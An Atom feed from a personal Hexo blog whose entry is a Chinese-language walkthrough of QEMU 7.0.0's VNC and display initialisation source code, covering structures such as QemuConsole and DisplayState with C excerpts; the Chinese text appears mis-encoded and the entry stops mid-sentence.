<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3çš„ç§˜å¯†å°å±‹</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2022-07-21T17:39:27.028Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€VIRTUALIZATION.0x01ã€‘Qemu - IIï¼šQemu VNC æ¨¡å—æºç åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-07-21T17:39:27.028Z</updated>
    
    <content type="html"><![CDATA[<p>vncï¼ŒğŸ•éƒ½ä¸ç”¨</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>VNC å³ Virtual Network Computingï¼Œæ˜¯åŸºäºRFBï¼ˆRemote Frame Bufferï¼‰åè®®è¿›è¡Œé€šä¿¡çš„è¿œç¨‹æ¡Œé¢åè®®ï¼Œä¸ telnetã€ssh ç­‰ç›¸æ¯”ï¼ŒVNC æœ€å¤§çš„ç‰¹ç‚¹ä¾¿æ˜¯æ”¯æŒå›¾å½¢åŒ–äº†ï¼Œç”¨æˆ·å¯ä»¥çœ‹åˆ°è¿œç¨‹æœºå™¨çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œä¸”èƒ½ä½¿ç”¨é”®ç›˜ä¸é¼ æ ‡è¿›è¡Œè¾“å…¥</p><p>Qemu è™šæ‹ŸæœºåŒæ ·æ”¯æŒé€šè¿‡ VNCåªéœ€è¦æŒ‡å®š <code>-vnc</code> å‚æ•°ä¾¿èƒ½å¤Ÿå»ºç«‹ VNC Serverï¼Œä»è€Œä½¿å¾—è¿œç¨‹ç”¨æˆ·å¯ä»¥é€šè¿‡ VNC è¿æ¥åˆ° Qemu è™šæ‹Ÿæœºä¸Š</p><p>æœ¬ç¯‡ä¸»è¦æ˜¯å¯¹ Qemu ä¸­ VNC å®ç°çš„æºç åˆ†æï¼ŒåŒæ—¶ä¹Ÿä¼šå¤¹æ‚ç€éƒ¨åˆ† Qemu æ˜¾ç¤ºç›¸å…³çš„åˆ†æï¼Œæºç ç‰ˆæœ¬ Qemu 7.0.0</p><h1 id="0x01-qemu-init-displays-æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–"><a href="#0x01-qemu-init-displays-æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–" class="headerlink" title="0x01. qemu_init_displays() - æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–"></a>0x01. qemu_init_displays() - æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ Qemu çš„å…¥å£å‡½æ•°æ˜¯ <code>softmmu/main.c</code> ä¸­çš„ <code>qemu_main()</code>ï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨åˆ° <code>sotftmmuvl.c</code> ä¸­çš„ <code>qemu_init()</code> å‡½æ•°è¿›è¡Œ Qemu çš„åˆå§‹åŒ–å·¥ä½œï¼ŒåŒ…æ‹¬ä¸€ç³»åˆ—çš„å‚æ•°è§£æã€è®¾å¤‡åˆå§‹åŒ–ç­‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">undef</span> main</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> main qemu_main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    qemu_init(argc, argv, envp);</span><br><span class="line">    qemu_main_loop();</span><br><span class="line">    qemu_cleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬ç¯‡æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC ç›¸å…³çš„å†…å®¹ï¼Œæ³¨æ„åˆ°åœ¨ <code>qemu_init()</code> çš„æœ«å°¾ä¼šè°ƒç”¨åˆ° <code>qemu_init_displays()</code> è¿›è¡Œæ˜¾ç¤ºåˆå§‹åŒ–çš„å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">qemu_init</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    qemu_init_displays();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€çŸ­ï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ <code>init_displaystate()</code> ä¸ <code>qemu_display_init()</code> å¯¹è™šæ‹Ÿæœºæœ¬åœ°çš„æ˜¾ç¤ºè®¾å¤‡è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹‹åæ‰æ˜¯ä½¿ç”¨ <code>qemu_opts_foreach</code> å®æ¥éå†å‚æ•°ä¸­ä¸ vnc ç›¸å…³çš„é…ç½®ï¼Œæœ€åè°ƒç”¨åˆ°çš„æ˜¯ <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qemu_init_displays</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    DisplayState *ds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* åˆå§‹åŒ–æœ¬åœ°æ˜¾ç¤º */</span></span><br><span class="line">    ds = init_displaystate();</span><br><span class="line">    qemu_display_init(ds, &amp;dpy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* å¿…é¡»åœ¨ç»ˆç«¯åˆå§‹åŒ–å, ç”± SDL åº“æ›´æ”¹ä¿¡å·çš„ handlers */</span></span><br><span class="line">    os_setup_signal_handling();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* åˆå§‹åŒ–è¿œç¨‹æ˜¾ç¤º */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VNC</span></span><br><span class="line">    qemu_opts_foreach(qemu_find_opts(<span class="string">&quot;vnc&quot;</span>),</span><br><span class="line">                      vnc_init_func, <span class="literal">NULL</span>, &amp;error_fatal);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (using_spice) &#123;</span><br><span class="line">        qemu_spice.display_init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“"><a href="#ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“"></a>ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“</h2><p>åœ¨ Qemu å½“ä¸­æœ‰ç€å¤šä¸ªä¸æ˜¾ç¤ºè®¾å¤‡ç›¸å…³çš„ç»“æ„ï¼Œä»–ä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>æœ¬å›¾æ¥è‡ªäº<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">è¿™ä¸ªppt</a></p></blockquote><h3 id="Iã€QemuConsole-å•ä¸ªæ§åˆ¶å°å®ä¾‹"><a href="#Iã€QemuConsole-å•ä¸ªæ§åˆ¶å°å®ä¾‹" class="headerlink" title="Iã€QemuConsole - å•ä¸ªæ§åˆ¶å°å®ä¾‹"></a>Iã€QemuConsole - å•ä¸ªæ§åˆ¶å°å®ä¾‹</h3><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ï¼š<code>QemuConsole</code>ï¼Œä¸€ä¸ªè¯¥ç»“æ„ä½“å®ä¾‹åœ¨ Qemu ä¸­è¡¨ç¤ºä¸€ä¸ªæ§åˆ¶å°ï¼ˆconsoleï¼‰å®ä¾‹ï¼Œå¯¹åº”ç€<strong>ä¸€ä¸ªç‰¹å®šçš„ VGA è®¾å¤‡ä¸ä¸€ç»„ç‰¹å®šçš„è¾“å…¥è®¾å¤‡</strong>ã€‚åœ¨ Qemu å½“ä¸­ä¸»è¦æœ‰ä¸¤ç±»æ§åˆ¶å°ï¼šå›¾å½¢åŒ–æ§åˆ¶å°ä¸å­—ç¬¦å‹æ§åˆ¶å°ã€‚</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuConsole</span> &#123;</span></span><br><span class="line">    Object parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">console_type_t</span> console_type; <span class="comment">// æ§åˆ¶å°ç±»å‹</span></span><br><span class="line">    DisplayState *ds;           <span class="comment">// å¯¹åº”çš„æ˜¾ç¤ºè®¾å¤‡</span></span><br><span class="line">    DisplaySurface *surface;</span><br><span class="line">    DisplayScanout scanout;</span><br><span class="line">    <span class="type">int</span> dcls;</span><br><span class="line">    DisplayGLCtx *gl;</span><br><span class="line">    <span class="type">int</span> gl_block;</span><br><span class="line">    QEMUTimer *gl_unblock_timer;</span><br><span class="line">    <span class="type">int</span> window_id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* å›¾å½¢åŒ–æ§åˆ¶å°çŠ¶æ€.  */</span></span><br><span class="line">    Object *device; <span class="comment">// å¯¹åº”çš„å›¾å½¢åŒ–è®¾å¤‡</span></span><br><span class="line">    <span class="type">uint32_t</span> head;</span><br><span class="line">    QemuUIInfo ui_info;</span><br><span class="line">    QEMUTimer *ui_timer;  <span class="comment">// å¯¹åº”çš„ Timer</span></span><br><span class="line">    <span class="type">const</span> GraphicHwOps *hw_ops;  <span class="comment">// ç¡¬ä»¶æ“ä½œå‡½æ•°</span></span><br><span class="line">    <span class="type">void</span> *hw;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* å­—ç¬¦æ§åˆ¶å°çŠ¶æ€ */</span></span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">int</span> total_height;</span><br><span class="line">    <span class="type">int</span> backscroll_height;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">int</span> x_saved, y_saved;</span><br><span class="line">    <span class="type">int</span> y_displayed;</span><br><span class="line">    <span class="type">int</span> y_base;</span><br><span class="line">    TextAttributes t_attrib_default; <span class="comment">/* é»˜è®¤å­—ç¬¦å±æ€§ */</span></span><br><span class="line">    TextAttributes t_attrib; <span class="comment">/* å½“å‰æ´»åŠ¨å­—ç¬¦å±æ€§ */</span></span><br><span class="line">    TextCell *cells;</span><br><span class="line">    <span class="type">int</span> text_x[<span class="number">2</span>], text_y[<span class="number">2</span>], cursor_invalidate;</span><br><span class="line">    <span class="type">int</span> echo;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> update_x0;</span><br><span class="line">    <span class="type">int</span> update_y0;</span><br><span class="line">    <span class="type">int</span> update_x1;</span><br><span class="line">    <span class="type">int</span> update_y1;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">TTYState</span> <span class="title">state</span>;</span></span><br><span class="line">    <span class="type">int</span> esc_params[MAX_ESC_PARAMS];</span><br><span class="line">    <span class="type">int</span> nb_esc_params;</span><br><span class="line"></span><br><span class="line">    Chardev *chr;</span><br><span class="line">    <span class="comment">/* å…ˆè¿›å…ˆå‡ºçš„æŒ‰é”®è¾“å…¥ */</span></span><br><span class="line">    Fifo8 out_fifo;</span><br><span class="line">    CoQueue dump_queue;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(QemuConsole) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹äºå›¾å½¢åŒ–è®¾å¤‡ç›¸å…³çš„æ“ä½œï¼Œä¸»è¦é€šè¿‡å‡½æ•°è¡¨ <code>hw_ops</code> æ¥å®Œæˆï¼Œå¯¹äºçº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡è€Œè¨€ï¼Œè¯¥å‡½æ•°è¡¨ä¸º <code>text_console_ops</code>ï¼Œå¯¹äºæ™®é€šçš„ VGA è®¾å¤‡è€Œè¨€åˆ™ä¸º <code>vga_ops</code>ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ã€‚</p><p>QemuConsole çš„åˆ›å»ºä¸»è¦é€šè¿‡ <code>new_console()</code> æ¥å®Œæˆï¼Œåœ¨ Qemu ä¸­æœ‰ä¸€ä¸ªå…¨å±€çš„ QemuConsole å˜é‡ <code>consoles</code>ï¼Œæ¯å½“åˆ›å»ºä¸€ä¸ªæ–°çš„ QemuConsole åå°±ä¼šé€šè¿‡å°¾æ’æ³•æ’å…¥åˆ°è¿™ä¸ªå…¨å±€çš„ QemuConsole é“¾è¡¨ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="title function_">QTAILQ_HEAD</span><span class="params">(, QemuConsole)</span> consoles =</span><br><span class="line">    QTAILQ_HEAD_INITIALIZER(consoles);</span><br></pre></td></tr></table></figure><blockquote><p>ä»€ä¹ˆæ˜¯ <code>console</code>ï¼Ÿç‹­ä¹‰åœ°è¯´ï¼Œconsole æœ€åˆæŒ‡çš„å°±æ˜¯ä¸€ä¸ªè®¾å¤‡çš„æ§åˆ¶å°ï¼Œ<em>åŒ…å«äº†æ˜¾ç¤ºè®¾å¤‡ä¸åŸºæœ¬è¾“å…¥è®¾å¤‡</em> ï¼Œä¸ terminal ä¸åŒï¼Œconsole é€šå¸¸æ˜¯æœºå™¨è‡ªå¸¦çš„ï¼Œè€Œ terminal åˆ™å¾€å¾€æŒ‡çš„æ˜¯éœ€è¦æˆ‘ä»¬é€šè¿‡ä¸²å£è¿›è¡Œè¿æ¥çš„å¤–éƒ¨è®¾å¤‡<br>ä¸è¿‡éšç€æ—¶ä»£çš„å‘å±•ï¼Œç°åœ¨å¯¹äº console ä¸ terminal ä¹‹é—´æ¦‚å¿µçš„å®šä¹‰åŒºåˆ«ä¹Ÿé€æ¸è¶‹äºæ¨¡ç³Šï¼Œç°åœ¨çš„æœºå™¨å¤§éƒ½ä¸å†æœ‰å®ä½“çš„ consoleï¼Œè€Œé‡‡ç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„æ–¹å¼ï¼Œä¾‹å¦‚åœ¨ Linux ä¸­å®šä¹‰äº† 6 ä¸ª virtual terminalï¼ˆå¯ä»¥ä½¿ç”¨ <code>ctrl + f1 ~ f6</code> è¿›è¡Œåˆ‡æ¢ï¼‰ï¼Œè€Œå½“æˆ‘ä»¬å‘ <code>/dev/console</code> è¾“å…¥æ—¶ï¼Œåˆ™ä¼šè¾“å‡ºåˆ°å½“å‰çš„ virtual terminal ä¸Šï¼›è€Œåœ¨ä¸€äº›å…¶ä»–çš„ç±» UNIX ç³»ç»Ÿä¸­ï¼Œconsole åˆ™å¾€å¾€è¢«å›ºå®šä¸ºç¬¬ä¸€ä¸ª virtual terminal</p></blockquote><h3 id="IIã€DisplayState-æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€"><a href="#IIã€DisplayState-æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€" class="headerlink" title="IIã€DisplayState - æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€"></a>IIã€DisplayState - æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€</h3><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ä¸€ä¸ª <code>DisplayState</code> è¡¨ç¤ºæ˜¾ç¤ºè®¾å¤‡çš„æ€»çŠ¶æ€ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DisplayState</span> &#123;</span></span><br><span class="line">    QEMUTimer *gui_timer;   <span class="comment">// å¯¹åº”æ›´æ–°çš„ timer</span></span><br><span class="line">    <span class="type">uint64_t</span> last_update;   <span class="comment">// ä¸Šæ¬¡æ›´æ–°æ—¶é—´</span></span><br><span class="line">    <span class="type">uint64_t</span> update_interval;</span><br><span class="line">    <span class="type">bool</span> refreshing;</span><br><span class="line">    <span class="type">bool</span> have_gfx;          <span class="comment">// æ˜¯å¦æœ‰å›¾å½¢åŒ–æ˜¾ç¤º</span></span><br><span class="line">    <span class="type">bool</span> have_text;         <span class="comment">// æ˜¯å¦æœ‰çº¯æ–‡æœ¬æ˜¾ç¤º</span></span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="comment">// å„ä¸ª Display çš„ Listener çš„é“¾è¡¨</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> DisplayState *display_state; <span class="comment">// å…¨å±€çš„ DisplayState</span></span><br></pre></td></tr></table></figure><p>é€šå¸¸è€Œè¨€ï¼Œä¸€ä¸ª DisplayState å¯ä»¥å¯¹åº”ç€å¤šä¸ª QemuConsoleï¼Œå› ä¸ºå…¶å¯ä»¥å¯¹åº”ç€å¤šä¸ª VGA è®¾å¤‡ï¼Œå› æ­¤ç›¸åº”åœ°å…¶å¯ä»¥æœ‰ç€å¤šä¸ª <code>DisplayChangeListener</code> æ¥ç›‘è§†å¤šä¸ª Display è®¾å¤‡çš„æ›´æ”¹ï¼Œå¤šä¸ª <code>DisplayChangeListener</code> ä¹‹é—´è¿æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€DisplayChangeListener-ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹"><a href="#IIIã€DisplayChangeListener-ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹" class="headerlink" title="IIIã€DisplayChangeListener - ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹"></a>IIIã€DisplayChangeListener - ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</h3><p><code>DisplayChangeListener</code> ç»“æ„ä½“ç”¨äº<strong>ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</strong>å¹¶è¿›è¡Œç›¸å…³æ“ä½œï¼Œå› æ­¤ä¸€ä¸ª DisplayChangeListener åº”å½“ä¸ä¸€ä¸ªç‰¹å®šçš„ QemuConsole ç›¸å…³è”</p><p>é€šå¸¸è€Œè¨€ä¸€ä¸ª QemuConsole å¯ä»¥æœ‰ç€å¤šä¸ª DisplayChangeListenerï¼ˆä¾‹å¦‚ä¸€ä¸ª QemuConsole å¯ä»¥å¯¹åº”æœ‰ç€ä¸€ä¸ª VNC çš„ DCL + ä¸€ä¸ªæœ¬åœ°è™šæ‹Ÿç»ˆç«¯çš„ DCLï¼‰</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/ui/console.h</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DisplayChangeListener</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> update_interval;</span><br><span class="line">    <span class="type">const</span> DisplayChangeListenerOps *ops;</span><br><span class="line">    DisplayState *ds;</span><br><span class="line">    QemuConsole *con;</span><br><span class="line"></span><br><span class="line">    QLIST_ENTRY(DisplayChangeListener) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶æˆå‘˜ <code>ops</code> ä¸ºä¸€ä¸ª <code>DisplayChangeListenerOps</code> å‡½æ•°è¡¨ï¼Œè¯¥å‡½æ•°è¡¨ä¸­åŒ…å«å¤§é‡çš„å‡½æ•°æŒ‡é’ˆï¼Œç”¨ä»¥è¿›è¡Œæ˜¾ç¤ºç›¸å…³çš„æ“ä½œï¼ˆä¾‹å¦‚ <code>dpy_refresh</code> æŒ‡é’ˆç”¨äºåˆ·æ–°æ˜¾ç¤ºï¼Œ <code>gfx_hw_update</code> æŒ‡é’ˆç”¨äºè¿›è¡Œæ˜¾å¡ç¡¬ä»¶ç›¸å…³æ›´æ–°ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ï¼‰</p><h2 id="ä¸€ã€init-displaystate-éå†æ‰€æœ‰çš„-QemuConsole-å¹¶åŠ å…¥-qom-treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹-console"><a href="#ä¸€ã€init-displaystate-éå†æ‰€æœ‰çš„-QemuConsole-å¹¶åŠ å…¥-qom-treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹-console" class="headerlink" title="ä¸€ã€init_displaystate() - éå†æ‰€æœ‰çš„ QemuConsole å¹¶åŠ å…¥ qom treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹ console"></a>ä¸€ã€init_displaystate() - éå†æ‰€æœ‰çš„ QemuConsole å¹¶åŠ å…¥ qom treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹ console</h2><p><code>init_displaystate()</code> ä¸»è¦ç”¨äºå¯¹ QemuConsole è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç”± main() è°ƒç”¨, åœ¨åˆ›å»º QemuConsoles ä¹‹å</span></span><br><span class="line"><span class="comment"> * åœ¨åˆå§‹åŒ– ui (sdl/vnc/...) ä¹‹å‰.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">DisplayState *<span class="title function_">init_displaystate</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    gchar *name;</span><br><span class="line">    QemuConsole *con;</span><br><span class="line"></span><br><span class="line">    get_alloc_displaystate();</span><br><span class="line">    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;</span><br><span class="line">            con-&gt;ds == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            text_console_do_init(con-&gt;chr, display_state);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* åœ¨è¿™é‡Œè¿æ¥ä¸Š qom tree (è€Œä¸åœ¨ new_console()), </span></span><br><span class="line"><span class="comment">         * åœ¨æ‰€æœ‰çš„ QemuConsoles éƒ½è¢«åˆ›å»ºåï¼Œå…¶é¡ºåºä¸åºå·</span></span><br><span class="line"><span class="comment">         * éƒ½å°†ä¸å†æ›´æ”¹ */</span></span><br><span class="line">        name = g_strdup_printf(<span class="string">&quot;console[%d]&quot;</span>, con-&gt;index);</span><br><span class="line">        object_property_add_child(container_get(object_get_root(), <span class="string">&quot;/backend&quot;</span>),</span><br><span class="line">                                  name, OBJECT(con));</span><br><span class="line">        g_free(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> display_state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æ˜¯éå†å…¨å±€çš„ QemuConsole é“¾è¡¨å¹¶å°†å…¶åŠ å…¥åˆ° qom tree ä¸­ï¼Œè‹¥éå›¾å½¢åŒ–çš„ console åˆ™è¿˜ä¼šè°ƒç”¨ <code>text_console_do_init()</code> è¿›è¡Œåˆå§‹åŒ–å·¥ä½œï¼Œä¸»è¦æ˜¯å°†å…¶è®¾ä¸ºæ ‡å‡†çš„ <code>80*24</code> çš„å­—ç¬¦æ˜¾ç¤ºè®¾å¤‡ï¼Œå¹¶å°†å…¶ <code>hw_ops</code> è®¾ä¸º <code>text_console_ops</code>ï¼Œå…¶ <code>hw</code> åˆ™æŒ‡å‘ QemuConsole è‡ªèº«</p><h2 id="äºŒã€qemu-display-init-è°ƒç”¨å¯¹åº”ç±»å‹-QemuDisplay-çš„-init-å‡½æ•°è¿›è¡Œåˆå§‹åŒ–"><a href="#äºŒã€qemu-display-init-è°ƒç”¨å¯¹åº”ç±»å‹-QemuDisplay-çš„-init-å‡½æ•°è¿›è¡Œåˆå§‹åŒ–" class="headerlink" title="äºŒã€qemu_display_init() - è°ƒç”¨å¯¹åº”ç±»å‹ QemuDisplay çš„ init å‡½æ•°è¿›è¡Œåˆå§‹åŒ–"></a>äºŒã€qemu_display_init() - è°ƒç”¨å¯¹åº”ç±»å‹ QemuDisplay çš„ init å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</h2><p>è¯¥å‡½æ•°åŒæ 